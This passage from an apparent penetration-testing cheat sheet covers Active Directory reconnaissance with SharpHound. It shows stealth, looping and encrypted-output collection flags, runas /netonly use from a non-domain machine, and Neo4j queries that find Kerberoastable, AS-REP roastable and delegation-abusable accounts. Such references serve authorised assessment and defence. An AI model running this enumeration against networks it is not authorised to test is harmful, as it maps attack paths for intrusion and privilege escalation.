role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Only collect user sessions and LocalGroup from computers, not the DC</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">ComputerOnly</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 228px;"></div><div class="CodeMirror-gutters" style="height: 278px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-stealth-usage">Stealth usage</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 412px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 412.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Stealth collection soutions</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">ComputerOnly</span> <span class="cm-operator">--</span><span class="cm-identifier">Stealth</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">ExcludeDomainControllers</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Encrypt the output archive with a random password</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">EncryptZip</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-loop-collection">Loop collection</h3>
<p id="bkmrk-useful-for-user-sess">Useful for user session collection for example. SharpHound will run the collection regularly and output a new zip file after each loop.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 528px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 528.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#It will loop during 2h by default</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">Session</span> <span class="cm-operator">--</span><span class="cm-identifier">Loop</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Loop during 5h</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SharpHound</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">CollectionMethod</span> <span class="cm-identifier">Session</span> <span class="cm-operator">--</span><span class="cm-identifier">Loop</span> <span class="cm-operator">--</span><span class="cm-identifier">Loopduration</span> <span class="cm-number">05</span><span class="cm-operator">:</span><span class="cm-number">00</span><span class="cm-operator">:</span><span class="cm-number">00</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-from-a-non-domain-jo">From a non domain joined computer</h3>
<ul id="bkmrk-configure-the-dns-of"><li>Configure the DNS of the machine to be the DC</li>
<li>Spawn a shell as a domain user</li>
<li>Verify youve got valid domain authentiation by using the <code>net</code> binary</li>
<li>Run SharpHound, using the <code>-d</code> flag to specify the AD domain you want to collect information from. You can also use any other flags you wish.</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 311px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">runas /netonly /user:CONTOSO\User1 cmd.exe</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">net view \\contoso\</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SharpHound.exe -d contoso.local</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 117px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-interesting-neo4j-qu">Interesting Neo4j queries</h3>
<h4 id="bkmrk-users-with-spns">Users with SPNs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 274.81px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>u<span class="cm-punctuation">:</span>User <span class="cm-bracket">{</span>hasspn<span class="cm-punctuation">:</span><span class="cm-atom">true</span><span class="cm-bracket">})</span> RETURN u</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-as-rep-roastable-use">AS-REP Roastable users</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 325.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>u<span class="cm-punctuation">:</span>User <span class="cm-bracket">{</span>dontrepreauth<span class="cm-punctuation">:</span><span class="cm-atom">true</span><span class="cm-bracket">})</span> RETURN u</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-computers-allowedtod">Computers AllowedToDelegate to other computers</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 557px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 557.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer<span class="cm-bracket">)</span><span class="cm-punctuation">,</span> <span class="cm-bracket">(</span>t<span class="cm-punctuation">:</span>Computer<span class="cm-bracket">)</span><span class="cm-punctuation">,</span> p<span class="cm-operator">=</span><span class="cm-bracket">((</span>c<span class="cm-bracket">)</span><span class="cm-operator">-</span><span class="cm-bracket">[</span><span class="cm-punctuation">:</span>AllowedToDelegate<span class="cm-bracket">]</span><span class="cm-operator">-&gt;</span><span class="cm-bracket">(</span>t<span class="cm-bracket">))</span> return p</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-shortest-path-from-k">Shortest path from Kerberoastable user</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 615px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 615px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>u<span class="cm-punctuation">:</span>User <span class="cm-bracket">{</span>hasspn<span class="cm-punctuation">:</span><span class="cm-atom">true</span><span class="cm-bracket">})</span><span class="cm-punctuation">,</span> <span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer<span class="cm-bracket">)</span><span class="cm-punctuation">,</span> p<span class="cm-operator">=</span>shortestPath<span class="cm-bracket">((</span>u<span class="cm-bracket">)</span><span class="cm-operator">-</span><span class="cm-bracket">[</span><span class="cm-operator">*</span><span class="cm-number">1</span>..<span class="cm-bracket">]</span><span class="cm-operator">-&gt;</span><span class="cm-bracket">(</span>c<span class="cm-bracket">))</span> RETURN p</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-computers-in-unconst">Computers in Unconstrained Delegations</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 420px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 419.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer <span class="cm-bracket">{</span>unconsraineddelegation<span class="cm-punctuation">:</span><span class="cm-atom">true</span><span class="cm-bracket">})</span> RETURN c</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-rights-against-gpos">Rights against GPOs</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 492px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 491.952px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>gr<span class="cm-punctuation">:</span><span class="cm-keyword">Group</span><span class="cm-bracket">)</span><span class="cm-punctuation">,</span> <span class="cm-bracket">(</span>gp<span class="cm-punctuation">:</span>GPO<span class="cm-bracket">)</span><span class="cm-punctuation">,</span> p<span class="cm-operator">=</span><span class="cm-bracket">((</span>gr<span class="cm-bracket">)</span><span class="cm-operator">-</span><span class="cm-bracket">[</span><span class="cm-punctuation">:</span>GenericWrite<span class="cm-bracket">]</span><span class="cm-operator">-&gt;</span><span class="cm-bracket">(</span>gp<span class="cm-bracket">))</span> return p</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-potential-sql-admins">Potential SQL Admins</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 376px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 376.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" 